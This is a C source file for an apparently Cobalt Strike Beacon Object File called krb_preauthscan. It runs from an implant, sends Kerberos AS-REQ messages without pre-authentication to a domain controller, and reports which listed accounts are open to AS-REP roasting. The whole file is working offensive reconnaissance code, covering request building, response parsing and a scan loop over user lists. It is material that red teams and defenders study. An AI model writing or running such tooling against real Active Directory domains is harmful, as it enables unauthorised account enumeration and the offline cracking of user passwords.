/*
 * krb_preauthscan - Scan for accounts without Kerberos pre-authentication
 *
 * Identifies accounts vulnerable to AS-REP roasting by sending AS-REQ
 * messages without pre-authentication data and checking responses.
 *
 * Usage: krb_preauthscan /users:USER1,USER2,USER3 [/domain:DOMAIN] [/dc:DC]
 *        krb_preauthscan /user:USER [/domain:DOMAIN] [/dc:DC]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Build AS-REQ without pre-authentication to test if account requires it */
static void build_preauth_test_request(KRB_BUFFER* out, const char* domain, const char* username) {
    KRB_BUFFER asreq, pvno, msg_type, req_body;
    KRB_BUFFER body, tmp, etype_seq, etype_list;
    BYTE kdc_opts[4];
    DWORD kdc_options = KDCOPTION_FORWARDABLE | KDCOPTION_RENEWABLE | KDCOPTION_CANONICALIZE;

    buf_init(&asreq, 2048);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&req_body, 1024);
    buf_init(&body, 1024);
    buf_init(&tmp, 256);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);

    /* Protocol version */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&asreq, 1, &pvno);

    /* Message type */
    asn1_encode_integer(&msg_type, KRB5_AS_REQ);
    asn1_context_wrap(&asreq, 2, &msg_type);


    /* KDC options */
    kdc_opts[0] = (kdc_options >> 24) & 0xFF;
    kdc_opts[1] = (kdc_options >> 16) & 0xFF;
    kdc_opts[2] = (kdc_options >> 8) & 0xFF;
    kdc_opts[3] = kdc_options & 0xFF;
    asn1_encode_bit_string(&tmp, kdc_opts, 4, 0);
    asn1_context_wrap(&body, 0, &tmp);
    buf_reset(&tmp);

    /* Client principal name */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        buf_init(&name_type, 16);
        buf_init(&name_string, 128);
        buf_init(&name_seq, 256);

        asn1_encode_integer(&name_type, KRB5_NT_PRINCIPAL);
        asn1_context_wrap(&name_seq, 0, &name_type);

        asn1_encode_general_string(&tmp, username);
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 1, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
    }
    buf_reset(&tmp);

    /* Realm */
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_reset(&tmp);

    /* Server principal name (krbtgt/REALM) */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        char krbtgt[256];
        buf_init(&name_type, 16);
        buf_init(&name_string, 128);
        buf_init(&name_seq, 256);

        sprintf(krbtgt, "krbtgt");

        asn1_encode_integer(&name_type, KRB5_NT_SRV_INST);
        asn1_context_wrap(&name_seq, 0, &name_type);

        buf_reset(&tmp);
        asn1_encode_general_string(&tmp, krbtgt);
        {
            KRB_BUFFER realm_str;
            buf_init(&realm_str, 128);
            asn1_encode_general_string(&realm_str, domain);
            buf_append(&tmp, realm_str.data, realm_str.length);
            buf_free(&realm_str);
        }
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 3, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
    }
    buf_reset(&tmp);

    /* Supported encryption types */
    asn1_encode_integer(&tmp, ETYPE_AES256_CTS_HMAC_SHA1);
    buf_append(&etype_list, tmp.data, tmp.length);
    buf_reset(&tmp);
    asn1_encode_integer(&tmp, ETYPE_AES128_CTS_HMAC_SHA1);
    buf_append(&etype_list, tmp.data, tmp.length);
    buf_reset(&tmp);
    asn1_encode_integer(&tmp, ETYPE_RC4_HMAC);
    buf_append(&etype_list, tmp.data, tmp.length);

    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);


    asn1_wrap(&req_body, ASN1_SEQUENCE, &body);
    asn1_context_wrap(&asreq, 4, &req_body);


    asn1_wrap(out, ASN1_APP(KRB5_AS_REQ), &asreq);

    buf_free(&asreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&req_body);
    buf_free(&body);
    buf_free(&tmp);
    buf_free(&etype_seq);
    buf_free(&etype_list);
}

/* Parse AS-REP/KRB-ERROR to determine if pre-auth is required */
static int check_preauth_response(const BYTE* data, size_t len, const char* username, formatp* output) {
    if (len < 10) return -1;

    /* Check message type */
    /* AS-REP starts with 0x6B (APPLICATION 11), KRB-ERROR starts with 0x7E (APPLICATION 30) */
    if (data[0] == 0x6B) {
        /* AS-REP - account does NOT require pre-auth! */
        BeaconFormatPrintf(output, "[+] VULNERABLE: %s - Does NOT require pre-authentication!\n", username);
        return 1;
    } else if (data[0] == 0x7E) {
        /* KRB-ERROR - parse error code */
        /* Skip to error code field */
        size_t offset = 2;
        size_t msg_len = asn1_decode_length(data, &offset);
        (void)msg_len;

        /* Look for error-code field (context tag 6) */
        while (offset < len - 2) {
            if (data[offset] == 0xA6) {
                offset++;
                size_t err_len = asn1_decode_length(data, &offset);
                (void)err_len;
                if (data[offset] == ASN1_INTEGER) {
                    offset++;
                    size_t int_len = asn1_decode_length(data, &offset);
                    int error_code = 0;
                    for (size_t i = 0; i < int_len && i < 4; i++) {
                        error_code = (error_code << 8) | data[offset + i];
                    }

                    if (error_code == KDC_ERR_PREAUTH_REQUIRED) {
                        BeaconFormatPrintf(output, "[-] %s - Pre-authentication required (not vulnerable)\n", username);
                        return 0;
                    } else if (error_code == KDC_ERR_C_PRINCIPAL_UNKNOWN) {
                        BeaconFormatPrintf(output, "[!] %s - Principal not found\n", username);
                        return -2;
                    } else {
                        BeaconFormatPrintf(output, "[?] %s - KRB Error: %d\n", username, error_code);
                        return -1;
                    }
                }
                break;
            }
            offset++;
        }
    }

    return -1;
}

/* Scan a single user */
static int scan_user(const char* dc_ip, const char* domain, const char* username, formatp* output) {
    WSADATA wsaData;
    SOCKET sock;
    KRB_BUFFER request;
    BYTE response[8192];
    int result = -1;

    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return -1;
    }

    sock = connect_to_kdc(dc_ip, KRB5_PORT);
    if (sock == INVALID_SOCKET) {
        WS2_32$WSACleanup();
        return -1;
    }

    buf_init(&request, 2048);
    build_preauth_test_request(&request, domain, username);

    if (send_krb_msg(sock, request.data, request.length) > 0) {
        int recv_len = recv_krb_msg(sock, response, sizeof(response));
        if (recv_len > 4) {
            /* Skip 4-byte length prefix */
            result = check_preauth_response(response + 4, recv_len - 4, username, output);
        }
    }

    buf_free(&request);
    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();

    return result;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* users = NULL;
    char* single_user = NULL;
    char* domain = NULL;
    char* dc = NULL;
    int vulnerable_count = 0;
    int scanned_count = 0;

    BeaconFormatAlloc(&output, 8192);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Scan for accounts without pre-authentication\n\n");


    users = arg_get(&parser, "users");
    single_user = arg_get(&parser, "user");
    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");

    if (!users && !single_user) {
        BeaconFormatPrintf(&output, "[-] Error: /users:USER1,USER2 or /user:USER required\n");
        BeaconFormatPrintf(&output, "\nUsage: krb_preauthscan /users:USER1,USER2,USER3 [/domain:DOMAIN] [/dc:DC]\n");
        BeaconFormatPrintf(&output, "       krb_preauthscan /user:USER [/domain:DOMAIN] [/dc:DC]\n");
        goto cleanup;
    }

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconFormatPrintf(&output, "[-] Error: Could not determine domain. Use /domain:DOMAIN\n");
            goto cleanup;
        }
        BeaconFormatPrintf(&output, "[*] Using domain: %s\n", domain);
    }

    if (!dc) {
        BeaconFormatPrintf(&output, "[-] Error: /dc:DC_IP required\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Target DC: %s\n", dc);
    BeaconFormatPrintf(&output, "[*] Scanning for accounts without pre-authentication...\n\n");

    if (single_user) {
        /* Scan single user */
        scanned_count = 1;
        if (scan_user(dc, domain, single_user, &output) == 1) {
            vulnerable_count++;
        }
    } else {
        /* Scan multiple users */
        char* user_list = (char*)malloc(strlen(users) + 1);
        strcpy(user_list, users);

        char* token = user_list;
        char* next;
        while (token && *token) {
            next = strchr(token, ',');
            if (next) *next++ = '\0';

            /* Trim whitespace */
            while (*token == ' ') token++;
            char* end = token + strlen(token) - 1;
            while (end > token && *end == ' ') *end-- = '\0';

            if (*token) {
                scanned_count++;
                if (scan_user(dc, domain, token, &output) == 1) {
                    vulnerable_count++;
                }
                KERNEL32$Sleep(100); /* Small delay between requests */
            }

            token = next;
        }

        free(user_list);
    }

    BeaconFormatPrintf(&output, "\n[*] Scan complete: %d/%d accounts vulnerable to AS-REP roasting\n",
        vulnerable_count, scanned_count);

cleanup:
    if (users) free(users);
    if (single_user) free(single_user);
    if (domain) free(domain);
    if (dc) free(dc);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
